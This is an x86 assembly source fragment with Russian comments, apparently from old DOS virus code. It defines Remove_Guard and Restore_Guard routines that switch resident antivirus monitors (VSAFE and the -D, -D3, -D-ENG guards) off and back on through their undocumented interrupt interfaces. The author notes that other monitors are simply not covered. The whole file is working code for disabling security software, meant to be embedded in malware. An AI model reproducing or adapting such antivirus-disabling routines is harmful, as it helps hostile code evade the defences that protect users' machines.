;
;   Этот файл содержит прграммы Remove_Guard и Restore_Guard выполняющие
;   соответственно деактивизацию и активизацию резидентных сторожей:
;	-D-ENG
;	-D
;	-D3
;	VSAFE
;
;    извини, остальных у меня нет, поэтому от них нет защиты
;


;--------Отключение резидентных антивирусов
Remove_Guard:
	xor bl,bl
	mov ax,0FA02h
	mov dx,05945h
	int 16h
	mov cs:Old_VSAFE,cl
	xor dl,dl
;
;  включение и выключение первых 10 настроек сторожей -D и -D3
;  вход DL=0/1 - выключить/включить
;
Protect_D:
	mov cx,10
next_parm:
	dec cl
	mov dh,0FFh
	mov ax,0CCCCh
	mov bx,055BBh
next_d:
	int 21h
	dec dh
	cmp dh,0F0h
	jnc next_d
	int 21h
	mov ax,0EBEBh
	mov bx,00101h
	mov dh,cl
	int 2Fh
	inc cl
	loop next_parm
	retn
;-------Восстановление работы антивирусов
Restore_Guard:
	mov ax,0FA02h
	mov dx,05945h
	byte 0B3h
Old_VSAFE byte 0
	int 16h
	mov dl,1
	jmp short Protect_D
